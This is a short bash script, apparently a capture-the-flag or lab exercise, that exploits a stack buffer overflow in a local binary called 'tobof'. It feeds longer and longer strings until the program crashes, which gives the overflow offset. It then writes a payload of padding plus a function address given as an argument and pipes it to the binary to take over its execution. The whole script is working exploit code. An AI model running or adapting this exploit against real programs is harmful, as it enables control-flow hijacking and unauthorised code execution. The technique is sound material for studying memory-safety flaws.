#!/bin/bash
 
buffer=0
 
function argCheck(){
    if [ $1 -lt 1 ]
    then
        echo "Need the function's address as argument"
        exit 0
    fi
}
 
function searchSegFault(){
    flag=0
    while [ $flag = 0 ];
    do
        buffer=$((buffer+1))
        # Buffer test
        python -c "print($buffer*'a')" > p.txt
        cat p.txt | ./tobof 
        # Seg Fault check
        if [ $? -ne 0 ]; then
            echo "Buffer overflow size found : " $buffer
            flag=1
        fi
    done
}
 
# Start Script 
argCheck $#
searchSegFault
 
# Creating the payload with the function's address in argument
python -c "print($buffer*'a'+\"$1\")" > p.txt
 
# Executing the payload
cat p.txt - | ./tobof
